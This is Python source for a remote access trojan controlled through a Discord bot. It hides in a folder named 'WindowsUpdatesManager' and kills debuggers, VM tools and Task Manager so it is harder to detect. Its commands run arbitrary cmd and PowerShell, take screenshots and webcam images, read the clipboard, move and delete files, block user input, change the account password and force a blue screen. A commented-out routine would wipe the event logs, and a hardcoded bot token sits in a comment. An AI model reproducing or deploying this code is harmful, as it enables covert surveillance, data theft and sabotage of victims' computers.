import os, json, discord, time, pynput, pyperclip, subprocess, psutil, threading
import modules.pc as pc
from PIL import ImageGrab
from shutil import make_archive, unpack_archive

#HOURS WASTED ON AUDIO STREAM: 3

class Variables:
    def __init__(self):
        t = os.getenv("TOKEN").split("MMM")
        self.token = t[0]
        self.snky_dir = f"{os.getenv('LOCALAPPDATA')}\\WindowsUpdatesManager"

        if os.path.exists(f"{self.snky_dir}\\cfg.json"):
            with open(f"{self.snky_dir}\\cfg.json", "r") as f:
                self.cfg = json.load(f)
        else:
            self.cfg = {
                "prefix": "!"
            }

            with open(f"{self.snky_dir}\\cfg.json", "w") as f:
                json.dump(self.cfg, f, indent=4)

#Requires admin privileges :(

#def clear_logs():
#    while True: 
#        #os.popen("wevtutil el | ForEach-Object {wevtutil cl \"$_\"}")
#       si = subprocess.STARTUPINFO()
#       si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
#       subprocess.Popen("wevtutil el | ForEach-Object {wevtutil cl \"$_\"}", shell=False, startupinfo=si) #Nope
#       time.sleep(1)

def process_check():
        while True:
            PROCESSES = [
                "http toolkit.exe",
                "httpdebuggerui.exe",
                "wireshark.exe",
                "fiddler.exe",
                "charles.exe",
                "regedit.exe",
                "cmd.exe",
                "taskmgr.exe",
                "vboxservice.exe",
                "df5serv.exe",
                "processhacker.exe",
                "vboxtray.exe",
                "vmtoolsd.exe",
                "vmwaretray.exe",
                "ida64.exe",
                "ollydbg.exe",
                "pestudio.exe",
                "vmwareuser",
                "vgauthservice.exe",
                "vmacthlp.exe",
                "x96dbg.exe",
                "vmsrvc.exe",
                "x32dbg.exe",
                "vmusrvc.exe",
                "prl_cc.exe",
                "prl_tools.exe",
                "qemu-ga.exe",
                "joeboxcontrol.exe",
                "ksdumperclient.exe",
                "ksdumper.exe",
                "joeboxserver.exe",
                "xenservice.exe",
            ]
            for proc in psutil.process_iter():
                if any(procstr in proc.name().lower() for procstr in PROCESSES):
                    try:
                        proc.kill()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass

intents = discord.Intents.all()
variables = Variables()

client = discord.Client(intents=intents)

#Suppress => blocks input (:D)
keyboard_listener = pynput.keyboard.Listener(suppress=True)
mouse_listener = pynput.mouse.Listener(suppress=True) 

@client.event
async def on_ready():
    threading.Thread(target=process_check, daemon=True).start()

@client.event
async def on_message(message, ):
    if message.author.bot:
        return

    #HELP MESSAGE
    if message.content.startswith(f"{variables.cfg['prefix']}help"):
        embed = discord.Embed(title="Help", color=0x00ff00)
        embed.add_field(name="!help", value="Shows this message", inline=False)
        embed.add_field(name="!hostinfo", value="Shows host information", inline=False)
        embed.add_field(name="!ipconfig", value="Shows IP configuration", inline=False)
        embed.add_field(name="!tasklist", value="Shows task list", inline=False)
        embed.add_field(name="!hwinfo", value="Shows hardware information", inline=False)
        embed.add_field(name="!changepassword", value="Changes password", inline=False)
        embed.add_field(name="!logout", value="Logs out", inline=False)
        embed.add_field(name="!shutdown", value="Shuts down", inline=False)
        embed.add_field(name="!ls", value="Lists directory", inline=False)
        embed.add_field(name="!del", value="Deletes file", inline=False)
        embed.add_field(name="!taskkill", value="Kills task", inline=False)
        embed.add_field(name="!open", value="Opens file", inline=False)
        embed.add_field(name="!upload", value="Uploads file", inline=False)
        embed.add_field(name="!download", value="Downloads file", inline=False)
        embed.add_field(name="!screenshot", value="Takes screenshot", inline=False)
        embed.add_field(name="!cam", value="Takes cam image", inline=False)
        embed.add_field(name="!mkdir", value="Creates directory", inline=False)
        embed.add_field(name="!rmdir", value="Deletes directory", inline=False)
        embed.add_field(name="!blockinput", value="Blocks input", inline=False)
        embed.add_field(name="!unblockinput", value="Unblocks input", inline=False)
        embed.add_field(name="!clipboard", value="Copies text to clipboard", inline=False)
        embed.add_field(name="!monitor", value="Turns monitor on/off", inline=False)
        embed.add_field(name="!cmd", value="Executes command", inline=False)
        embed.add_field(name="!ps", value="Executes powershell command", inline=False)
        embed.add_field(name="!bsod", value="Executes BSoD", inline=False)
        embed.add_field(name="!globalinfo", value="Shows global information", inline=False)
        embed.add_field(name="!zip", value="Zips directory", inline=False)
        embed.add_field(name="!unzip", value="Unzips file", inline=False)


        await message.channel.send(embed=embed)

    #HOSTINFO - systeminfo cmd
    if message.content.startswith(f"{variables.cfg['prefix']}hostinfo"):
        embed = discord.Embed(title="Host Info", description="Host information gathered.", color=0x00ff00)

        result = pc.hostinfo(variables.snky_dir)

        while not os.path.exists(f"{variables.snky_dir}\\hostinfo.txt"):
            time.sleep(2)

        try:
            await message.channel.send(embed=embed, file=discord.File(result))
            time.sleep(0.3)
            os.remove(f"{variables.snky_dir}\\hostinfo.txt")
        except:
            pass

    #IPCONFIG - ipconfig cmd
    if message.content.startswith(f"{variables.cfg['prefix']}ipconfig"):
        embed = discord.Embed(title="IP Config", description="IP config gathered.", color=0x00ff00)

        result = pc.ipconfig(variables.snky_dir)

        while not os.path.exists(f"{variables.snky_dir}\\ipconfig.txt"):
            time.sleep(2)

        try:
            await message.channel.send(embed=embed, file=discord.File(result))
            time.sleep(0.3)
            os.remove(f"{variables.snky_dir}\\ipconfig.txt")
        except:
            pass

    #TASKLIST - tasklist cmd
    if message.content.startswith(f"{variables.cfg['prefix']}tasklist"):
        embed = discord.Embed(title="Task List", description="Task list gathered.", color=0x00ff00)

        result = pc.tasklist(variables.snky_dir)

        while not os.path.exists(f"{variables.snky_dir}\\tasklist.txt"):
            time.sleep(2)

        try:
            await message.channel.send(embed=embed, file=discord.File(result))
            time.sleep(0.3)
            os.remove(f"{variables.snky_dir}\\tasklist.txt")
        except:
            pass

    #HARDWARE INFO
    if message.content.startswith(f"{variables.cfg['prefix']}hwinfo"):
        embed = discord.Embed(title="Hardware Info", description="Hardware information gathered.", color=0x00ff00)

        result = pc.hwinfo(variables.snky_dir)

        try:
            await message.channel.send(embed=embed, file=discord.File(result))
            time.sleep(0.3)
            os.remove(f"{variables.snky_dir}\\hwinfo.txt")
        except:
            pass
        
    #CHANGE PASSWORD
    if message.content.startswith(f"{variables.cfg['prefix']}changepassword"):
        args = message.content.split(" ")
        if len(args) == 1:
            embed = discord.Embed(title="Change password", description="Usage: !changepass <new_password>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        try:
            os.popen(f"net user {os.getlogin()} {args[1]}")
            embed = discord.Embed(title="Change password", description="Password changed.", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Change password", description="Error changing password.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #LOGOUT
    if message.content.startswith(f"{variables.cfg['prefix']}logout"):
        embed = discord.Embed(title="Logout", description="Logging out...", color=0x00ff00)
        
        await message.channel.send(embed=embed)
        os.popen("shutdown /l")

    #SHUTDOWN
    if message.content.startswith(f"{variables.cfg['prefix']}shutdown"):
        embed = discord.Embed(title="Shutdown", description="Shutting down...", color=0x00ff00)

        await message.channel.send(embed=embed)
        os.popen("shutdown /s /t 0")

    #LIST DIR
    if message.content.startswith(f"{variables.cfg['prefix']}ls"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="List directory", description="Usage: !ls <dir>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        
        try:
            files = os.listdir(args[1])
            files = "\n".join(files)
            embed = discord.Embed(title="List directory", description="Files listed.", color=0x00ff00)
            await message.channel.send(embed=embed)
            await message.channel.send(f"```{files}```")
        except:
            embed = discord.Embed(title="List directory", description="Error listing directory.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #DELETE FILE
    if message.content.startswith(f"{variables.cfg['prefix']}del"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Delete", description="Usage: !del <file>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            os.remove(args[1])
            embed = discord.Embed(title="Delete", description=f"File {args[1]} deleted.", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Delete", description="Error deleting file.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #TASKKILL
    if message.content.startswith(f"{variables.cfg['prefix']}taskkill"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Taskkill", description="Usage: !taskkill <pid>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            os.popen(f"taskkill /PID {args[1]} /F")
            await message.channel.send(f"Killed ```{args[1]}```")
        except:
            embed = discord.Embed(title="Taskkill", description="Error killing task. Make sure the PID is correct or the file is not elevated.", color=0x00ff00)
            await message.channel.send(embed=embed) #No admin privileges :(
            
    #OPEN FILE
    if message.content.startswith(f"{variables.cfg['prefix']}open"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Open", description="Usage: !open <file>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            os.startfile(args[1])
            embed = discord.Embed(title="Open", description=f"Opened {args[1]}", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            await message.channel.send("Error opening file.")

    #UPLOAD FILE
    if message.content.startswith(f"{variables.cfg['prefix']}upload"):
        if len(message.attachments) == 0:
            embed = discord.Embed(title="Upload", description="No file attached.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        attachment = message.attachments[0]

        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Upload", description="Usage: !upload <path>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        
        
        await attachment.save(f"{args[1]}\\{attachment.filename}")
        
        embed = discord.Embed(title="Upload", description=f"Uploaded {attachment.filename}", color=0x00ff00)
        await message.channel.send(embed=embed)

    #DOWNLOAD FILE
    if message.content.startswith(f"{variables.cfg['prefix']}download"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Download", description="Usage: !download <file>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            embed = discord.Embed(title="Download", description="File downloaded.", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Download", description=f"Error downloading file\n{Exception}", color=0x00ff00)
            await message.channel.send(embed=embed)

    #SCREENSHOT
    if message.content.startswith(f"{variables.cfg['prefix']}screenshot"):
        embed = discord.Embed(title="Screenshot", description="Taking screenshot...", color=0x00ff00)

        await message.channel.send(embed=embed)
        
        ImageGrab.grab().save(f"{variables.snky_dir}\\screenshot.png")

        while not os.path.exists(f"{variables.snky_dir}\\screenshot.png"):
            time.sleep(1)
        
        try:
            await message.channel.send(file=discord.File(f"{variables.snky_dir}\\screenshot.png"))
            os.remove(f"{variables.snky_dir}\\screenshot.png")
        except:
            pass

    #CAM IMG - FIX THIS [[ERROR:0@1.593] global obsensor_uvc_stream_channel.cpp:159 cv::obsensor::getStreamChannelGroup Camera index out of range]
    if message.content.startswith(f"{variables.cfg['prefix']}cam"):
        embed = discord.Embed(title="Cam", description="Taking cam image...", color=0x00ff00)

        await message.channel.send(embed=embed)

        returned = pc.cam_img(variables.snky_dir)

        if not returned:
            await message.channel.send("No camera found.")
            return

        while not os.path.exists(f"{variables.snky_dir}\\cam.jpg"):
            time.sleep(1)

        try:
            await message.channel.send(file=discord.File(f"{variables.snky_dir}\\cam.jpg"))
            os.remove(f"{variables.snky_dir}\\cam.jpg")
        except:
            pass
    
    #CREATE DIR
    if message.content.startswith(f"{variables.cfg['prefix']}mkdir"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Mkdir", description="Usage: !mkdir <dir>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            os.mkdir(args[1])
            embed = discord.Embed(title="Mkdir", description=f"Created {args[1]}", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Mkdir", description="Error creating directory.", color=0x00ff00)
            await message.channel.send(embed=embed)
    
    #DELETE DIR
    if message.content.startswith(f"{variables.cfg['prefix']}rmdir"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Rmdir", description="Usage: !rmdir <dir>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            os.rmdir(args[1])
            embed = discord.Embed(title="Rmdir", description=f"Deleted {args[1]}", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Rmdir", description="Error deleting directory.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #BLOCK INPUT
    if message.content.startswith(f"{variables.cfg['prefix']}blockinput"):
        keyboard_listener.start()
        mouse_listener.start()

        embed = discord.Embed(title="Block Input", description="Input blocked.", color=0x00ff00)
        await message.channel.send(embed=embed)
    
    #UNBLOCK INPUT
    if message.content.startswith(f"{variables.cfg['prefix']}unblockinput"):
        keyboard_listener.stop()
        mouse_listener.stop()

        embed = discord.Embed(title="Unblock Input", description="Input unblocked.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #CLIPBOARD
    if message.content.startswith(f"{variables.cfg['prefix']}clipboard"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Clipboard", description="Usage: !clipboard <set/get> <text>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        
        if len(args) == 2 and args[1] != "get":
            embed = discord.Embed(title="Clipboard", description="Usage: !clipboard <set/get> <if SET, then text>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        if args[1] == "set":
            try:
                pyperclip.copy(args[2])
                embed = discord.Embed(title="Clipboard", description="Text copied to clipboard.", color=0x00ff00)
                await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(title="Clipboard", description="Error copying text to clipboard.", color=0x00ff00)
                await message.channel.send(embed=embed)
        elif args[1] == "get":
            try:
                text = pyperclip.paste()
                embed = discord.Embed(title="Clipboard", description=f"Text in clipboard: {text}", color=0x00ff00)
                await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(title="Clipboard", description="Error getting text from clipboard. Text might be too long or empty.", color=0x00ff00)
                await message.channel.send(embed=embed)

    #MONITOR CONTROL
    if message.content.startswith(f"{variables.cfg['prefix']}monitor"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Monitor", description="Usage: !monitor <on/off>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        if args[1] == "on":
            pc.monitor("on")
            embed = discord.Embed(title="Monitor", description="Monitor turned on.", color=0x00ff00)
            await message.channel.send(embed=embed)
        elif args[1] == "off":
            pc.monitor("off")
            embed = discord.Embed(title="Monitor", description="Monitor turned off.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #CMD EXEC
    if message.content.startswith(f"{variables.cfg['prefix']}cmd"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="CMD", description="Usage: !cmd <command>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            result = subprocess.Popen(args[1], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]

            with(open(f"{variables.snky_dir}\\cmd.txt", "w")) as f:
                f.write(result.decode("utf-8"))

            embed = discord.Embed(title="CMD", description="Command executed.", color=0x00ff00)
            await message.channel.send(embed=embed, file=discord.File(f"{variables.snky_dir}\\cmd.txt"))

            os.remove(f"{variables.snky_dir}\\cmd.txt")
        except Exception as e:
            print(e)
            embed = discord.Embed(title="CMD", description="Error executing command.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #POWERSHELL EXEC
    if message.content.startswith(f"{variables.cfg['prefix']}ps"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="PS", description="Usage: !ps <command>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            result = subprocess.Popen(f"powershell {args[1]}", shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]

            with(open(f"{variables.snky_dir}\\ps.txt", "w")) as f:
                f.write(result.decode("utf-8"))

            embed = discord.Embed(title="PS", description=f"Powerhsell executed.", color=0x00ff00)
            await message.channel.send(embed=embed ,file=discord.File(f"{variables.snky_dir}\\ps.txt"))

            os.remove(f"{variables.snky_dir}\\ps.txt")
        except:
            embed = discord.Embed(title="PS", description="Error executing command.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #BLUE SCREEN
    if message.content.startswith(f"{variables.cfg['prefix']}bsod"):
        embed = discord.Embed(title="BSOD", description="BSoD executed...", color=0x00ff00)
        await message.channel.send(embed=embed)
        pc.bsod()

    #GLOBAL INFO
    if message.content.startswith(f"{variables.cfg['prefix']}globalinfo"):
        embed = discord.Embed(title="Global information gathered.", description=pc.global_info(), color=0x00ff00)
        await message.channel.send(embed=embed)
    
    #ZIP DIR
    if message.content.startswith(f"{variables.cfg['prefix']}zip"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Zip", description="Usage: !zip <dir> <output_dir>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        
        try:
            make_archive(args[2], 'zip', args[1])
            embed = discord.Embed(title="Zip", description="Directory zipped.", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Zip", description="Error zipping directory.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #UNZIP FILE
    if message.content.startswith(f"{variables.cfg['prefix']}unzip"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Unzip", description="Usage: !unzip <file> <output_dir>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        
        try:
            unpack_archive(args[1], args[2])
            embed = discord.Embed(title="Unzip", description="File unzipped.", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Unzip", description="Error unzipping file.", color=0x00ff00)
            await message.channel.send(embed=embed)

client.run(variables.token)
#client.run("MTIyNTc5MTM4NjM2NDgwOTI1Ng.GgyZrr.lfp7eiYfTFxlNA4KIWTuR4vgCyJEgapPpA97Yc")
